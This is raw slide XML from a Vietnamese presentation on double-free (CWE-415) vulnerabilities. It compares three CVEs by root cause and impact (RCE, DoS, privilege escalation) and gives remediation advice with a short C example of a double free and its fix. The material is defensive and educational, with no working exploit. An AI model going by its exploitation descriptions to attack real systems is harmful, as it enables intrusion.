          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5257800"/>
            <a:ext cx="2281428" cy="85039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User cục bộ quyền thấp; phải thắng race, thử lặp nhiều lần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="4800600"/>
            <a:ext cx="2647188" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5161"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="4965192"/>
            <a:ext cx="2281428" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KHẮC PHỤC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="5257800"/>
            <a:ext cx="2281428" cy="850392"/>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Bản vá Patch Tuesday 11/2025; theo dõi CISA KEV</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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Điểm chung của ba CVE</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4–5 · CÙNG MỘT CHUỖI VỚI POC USERLAND</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="2542032" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4615"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Vùng nhớ / object bị giải phóng hai lần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3035808" y="2011680"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3369564" y="1417320"/>
            <a:ext cx="2542032" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4615"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Allocator cấp lại cùng vùng cho hai mục đích</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5948172" y="2011680"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6281928" y="1417320"/>
            <a:ext cx="2542032" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4615"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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Kẻ tấn công ghi đè cấu trúc / con trỏ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8860536" y="2011680"/>
            <a:ext cx="301752" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9194292" y="1417320"/>
            <a:ext cx="2542032" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4615"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Chiếm quyền thực thi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="15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7200" y="2880360"/>
          <a:ext cx="11274552" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2011680"/>
                <a:gridCol w="4206240"/>
                <a:gridCol w="2286000"/>
                <a:gridCol w="2770632"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Nguồn gốc free trùng</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tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Khớp mẫu ở 5.2</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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Kết quả</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r>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE-2026-33824</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Blob Security Realm sao chép nông sang PacketContext</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shallow copy</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RCE trong context SYSTEM</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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE-2026-23918</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Hai callback cùng đẩy h2_stream vào mảng cleanup</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hai nơi cùng dọn dẹp</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DoS; RCE khi dùng mmap allocator</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300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>CVE-2025-62215</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Race condition trên tài nguyên dùng chung trong kernel</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đa luồng / sai đồng bộ</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300" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Leo quyền lên SYSTEM</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="13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bl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5074920"/>
            <a:ext cx="11274552" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6400"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5239512"/>
            <a:ext cx="10908792" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phần 08 không vá riêng từng CVE mà loại bỏ cả lớp lỗi CWE-415, ở nhiều tầng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="16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731520" y="640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>08</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Khắc phục &amp; phòng ngừa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 7 · double free là lỗi quyền sở hữu vùng nhớ, chia theo tầng từ rẻ và sớm nhất</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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9.1  Mã nguồn</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9.2  Công cụ</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9.3  Allocator / runtime</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9.4  Hệ thống / vận hành</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>9.5  Đối chiếu 3 CVE</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Tầng mã nguồn: ngăn lỗi phát sinh</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7 · 9.1 · RẺ VÀ SỚM NHẤT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="4572000" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="4206240" cy="2514600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/* Sai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free(p);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(p);          /* double free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 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/* Đúng */</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free(p);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>p = NULL;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>free(p);          /* free(NULL): không làm gì */</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4389120"/>
            <a:ext cx="4572000" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4526280"/>
            <a:ext cx="4206240" cy="1600200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>// C++: vòng đời do compiler quản lý</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>auto p = std::make_unique&lt;Obj&gt;();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>// ra khỏi scope: giải phóng đúng 1 lần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="1417320"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="1581912"/>
            <a:ext cx="27569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MỘT CON TRỎ, MỘT CHỦ SỞ HỮU</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="1874520"/>
            <a:ext cx="2756916" cy="1719072"/>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Xác định rõ hàm/struct nào chịu trách nhiệm free; tránh copy nông (shallow copy) struct chứa con trỏ — đúng nguyên nhân CVE-2026-33824 (9.5), nên deep copy hoặc refcount</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8609076" y="1417320"/>
            <a:ext cx="3122676" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
